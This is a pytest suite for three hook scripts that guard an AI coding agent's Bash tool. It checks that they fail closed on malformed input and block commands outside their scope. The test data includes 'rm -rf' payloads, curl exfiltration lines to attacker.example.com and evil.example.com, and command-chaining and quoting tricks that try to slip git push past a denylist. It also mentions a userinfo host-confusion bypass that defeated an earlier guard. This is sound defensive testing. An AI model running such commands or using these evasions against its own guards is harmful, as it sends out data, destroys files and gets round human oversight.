"""The three agent Bash guards must fail closed on input they cannot read.

Each guard's own docstring states the intent: research-agent-bash-guard.py
("Fail closed. A research agent losing Bash is a nuisance; a research agent
running an unvetted command is the thing this exists to stop"),
quick-cop-bash-guard.py ("Fail closed by design ... an unrecognized command is
not evidence it is safe"), and verify-loop-git-guard.py (the 2026-08-25
incident of an unasked-for commit and push). This pins the code to those
docstrings.

Two failure directions are tested, because they are different bugs:

  * A guard that returns 0 has decided the command is safe on no evidence.
  * A guard that raises exits 1, and 1 is neither allow (0) nor block (2)
    under this hook contract, so the command runs anyway. Every payload here
    is valid JSON of an unexpected shape, which is exactly what a naive
    payload.get(...).get(...) chain raises on.

Guards are driven as real subprocesses so the exit code measured is the one
Claude Code would actually see, including anything escaping main().
"""

import importlib.util
import io
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

HOOKS = Path(__file__).resolve().parents[1] / "hooks"


def _load_guard(filename: str):
    """Import a hook by path. Their filenames use hyphens, so the normal
    import statement cannot reach them."""
    name = "_cr_" + filename.removesuffix(".py").replace("-", "_")
    spec = importlib.util.spec_from_file_location(name, HOOKS / filename)
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module

GUARDS = [
    "research-agent-bash-guard.py",
    "verify-loop-git-guard.py",
    "quick-cop-bash-guard.py",
]

# Valid JSON, unexpected shape. Every one of these breaks a naive .get chain.
MALSHAPED_PAYLOADS = [
    "null",
    "42",
    "[1,2,3]",
    '"str"',
    '{"tool_name": "Bash", "tool_input": null}',
    '{"tool_name": "Bash", "tool_input": "rm -rf /"}',
    '{"tool_name": "Bash", "tool_input": {"command": ["git", "push"]}}',
    '{"tool_name": "Bash", "tool_input": {"command": 42}}',
]

UNPARSEABLE_PAYLOADS = ["{not valid json", "", "   \n  "]


# What a Python process needs from the OS to start at all, and nothing else.
# None of these three guards reads os.environ, so declaring the environment
# rather than inheriting it turns that into something the suite proves instead
# of something a reader has to take on trust: an ambient toggle can never be
# what makes one of these verdicts come out the way it does.
_ENV_ALLOWLIST = frozenset({
    "PATH", "PATHEXT", "COMSPEC", "SYSTEMROOT", "SYSTEMDRIVE", "WINDIR",
    "TEMP", "TMP", "TMPDIR",
    "PYTHONHOME", "PYTHONIOENCODING", "PYTHONUTF8", "LANG", "LC_ALL",
})


def _hermetic_env() -> dict:
    return {k: v for k, v in os.environ.items() if k.upper() in _ENV_ALLOWLIST}


def _run(guard: str, stdin_text: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(HOOKS / guard)],
        input=stdin_text,
        capture_output=True,
        text=True,
        env=_hermetic_env(),
    )


def _bash(command: str) -> str:
    return json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})


@pytest.mark.parametrize("guard", GUARDS)
@pytest.mark.parametrize("payload", MALSHAPED_PAYLOADS)
def test_malshaped_payload_is_refused_not_crashed(guard, payload):
    result = _run(guard, payload)
    assert "Traceback" not in result.stderr, (
        f"{guard} crashed on {payload!r} instead of refusing:\n{result.stderr}"
    )
    assert result.returncode == 2, (
        f"{guard} returned {result.returncode} for {payload!r}. Only 2 blocks; "
        "0 allows and 1 is an uncaught exception, which also allows."
    )


@pytest.mark.parametrize("guard", GUARDS)
@pytest.mark.parametrize("payload", UNPARSEABLE_PAYLOADS)
def test_unparseable_payload_is_refused(guard, payload):
    result = _run(guard, payload)
    assert result.returncode == 2, (
        f"{guard} returned {result.returncode} for stdin {payload!r}. A payload "
        "the guard cannot parse is not evidence the command is safe."
    )


@pytest.mark.parametrize("guard", GUARDS)
@pytest.mark.parametrize("payload", MALSHAPED_PAYLOADS)
def test_main_returns_a_refusal_rather_than_raising(guard, payload):
    """main() itself has to return 2, not lean on the __main__ handler.

    The subprocess tests above pass either way, because __main__ catches
    anything escaping main() and refuses. That safety net only exists when the
    file is run as a script: a caller that imports the module and calls main()
    gets the exception instead, and an exception is not a block.
    """
    module = _load_guard(guard)
    stdin = io.StringIO(payload)
    saved, sys.stdin = sys.stdin, stdin
    try:
        rc = module.main()
    except Exception as exc:  # noqa: BLE001 - the thing under test
        pytest.fail(f"{guard}.main() raised {exc!r} on {payload!r} instead of returning 2")
    finally:
        sys.stdin = saved
    assert rc == 2, f"{guard}.main() returned {rc} for {payload!r}"


@pytest.mark.parametrize("guard", GUARDS)
def test_a_non_bash_tool_call_is_none_of_their_business(guard):
    payload = json.dumps({"tool_name": "Read", "tool_input": {"file_path": "x.py"}})
    result = _run(guard, payload)
    assert result.returncode == 0, (
        f"{guard} blocked a Read call. These guards scope to Bash only; "
        "blocking anything else would take work away for no security gain."
    )


class TestResearchAgentCageStillAllowsItsOneJob:
    """Failing closed is only correct if the work the cage exists to permit
    still gets through. A guard people cannot work with gets switched off."""

    @pytest.mark.parametrize(
        "command",
        [
            "curl http://127.0.0.1:8613/status",
            "curl -s -X POST http://127.0.0.1:8613/search -d '{\"query\":\"x\"}'",
            "curl -s -X POST http://localhost:8613/web-search -H 'Content-Type: application/json' -d '{\"query\":\"y\"}'",
            "git clone --depth 1 https://github.com/example/repo.git",
        ],
    )
    def test_allowed_command_still_passes(self, command):
        result = _run("research-agent-bash-guard.py", _bash(command))
        assert result.returncode == 0, (
            f"The cage refused a command it exists to permit: {command!r}\n"
            f"{result.stderr}"
        )

    @pytest.mark.parametrize(
        "command",
        [
            "curl http://127.0.0.1:8613/search; rm -rf /some/path",
            "curl http://127.0.0.1:8613/search && rm -rf /some/path",
            "curl http://127.0.0.1:8613/search\nrm -rf /some/path",
            "curl http://127.0.0.1:8613/search\r\nrm -rf /some/path",
            "curl https://attacker.example.com/exfil",
            "python -c 'print(1)'",
            # The userinfo host confusion that defeated scripts/bash-guard.py.
            # ALLOWED_HOST_RE requires a numeric port then '/' straight after
            # the loopback host, which no userinfo authority can satisfy, so
            # this cage never had that hole. Pinned so it stays that way.
            "curl https://127.0.0.1:secret@evil.example.com/exfil",
            "curl https://localhost:token@evil.example.com/exfil",
            "curl https://evil.example.com@127.0.0.1:8613/x",
        ],
    )
    def test_command_outside_the_cage_is_refused(self, command):
        result = _run("research-agent-bash-guard.py", _bash(command))
        assert result.returncode == 2, (
            f"The cage allowed {command!r} (exit {result.returncode})"
        )


class TestVerifyLoopGuardScopesItsRefusalToGit:
    """This guard is a git-only denylist over otherwise broad Bash. Refusing
    every command it cannot tokenize would block builds and tests over a stray
    quote, so the refusal is scoped to commands that actually mention git."""

    def test_unparseable_non_git_command_still_runs(self):
        # An unbalanced quote in a grep pattern. shlex.split raises, but no git
        # token is present, so there is nothing this denylist could block.
        command = "grep -rn \"it's fine"
        result = _run("verify-loop-git-guard.py", _bash(command))
        assert result.returncode == 0, (
            "A non-git command with a stray quote was blocked by a git-only "
            f"denylist (exit {result.returncode}): {result.stderr}"
        )

    def test_unparseable_git_command_is_refused(self):
        command = "git commit -m 'fix: don't break the build'"
        result = _run("verify-loop-git-guard.py", _bash(command))
        assert result.returncode == 2, (
            f"An unparseable git command was allowed (exit {result.returncode})"
        )

    def test_git_command_no_tokenizer_can_read_is_refused(self):
        # An unterminated double quote defeats both tokenizing passes, so the
        # guard genuinely cannot see this command's structure. It mentions git,
        # so it is refused rather than guessed at.
        command = 'git commit -m "unterminated'
        result = _run("verify-loop-git-guard.py", _bash(command))
        assert result.returncode == 2, (
            f"A git command no tokenizer could read was allowed "
            f"(exit {result.returncode})"
        )

    def test_non_git_command_no_tokenizer_can_read_still_runs(self):
        command = 'grep -rn "unterminated'
        result = _run("verify-loop-git-guard.py", _bash(command))
        assert result.returncode == 0, (
            "A non-git command was blocked by a git-only denylist "
            f"(exit {result.returncode}): {result.stderr}"
        )

    def test_read_only_git_still_passes(self):
        result = _run("verify-loop-git-guard.py", _bash("git status --porcelain"))
        assert result.returncode == 0, result.stderr


class TestVerifyLoopGuardReadsWindowsAndPosixAlike:
    """shlex.split() defaults to POSIX mode, where a backslash is an escape.
    That turns a Windows path to git.exe into tokens with no "git" in them, so
    the binary the denylist keys on disappears, on the platform this project
    mainly runs on."""

    @pytest.mark.parametrize(
        "command",
        [
            r"C:\Program Files\Git\bin\git.exe commit -m ok",
            r"C:\Program Files\Git\bin\git.exe push origin main",
            r"C:\tools\git.exe reset --hard HEAD",
            "/usr/bin/git commit -m ok",
            "/usr/local/bin/git push origin main",
            "git commit -m ok",
            "git push",
            # Quoting the binary name hides it from the pass that keeps quotes
            # attached to their token, which is why the POSIX pass is still run
            # alongside that one rather than replaced by it.
            '"git" commit -m ok',
            "'git' push origin main",
            'g""it commit -m ok',
        ],
    )
    def test_a_blocked_subcommand_is_refused_however_git_is_spelled(self, command):
        result = _run("verify-loop-git-guard.py", _bash(command))
        assert result.returncode == 2, (
            f"A blocked git subcommand was allowed (exit {result.returncode}): "
            f"{command!r}"
        )

    @pytest.mark.parametrize(
        "command",
        [
            # git named in prose, not invoked. The second tokenizing pass keeps
            # the quotes on the token, so these stay arguments rather than
            # becoming invocations.
            'echo "git commit is the orchestrator\'s job"',
            "grep -rn 'git commit' .",
            r"git -C C:\proj\SomeRepo status",
            r"dotnet test C:\proj\App.Tests\App.Tests.csproj",
            "python -m pytest scripts/tests/ -q",
        ],
    )
    def test_ordinary_work_still_runs(self, command):
        result = _run("verify-loop-git-guard.py", _bash(command))
        assert result.returncode == 0, (
            f"Ordinary work was blocked by a git-only denylist: {command!r}\n"
            f"{result.stderr}"
        )

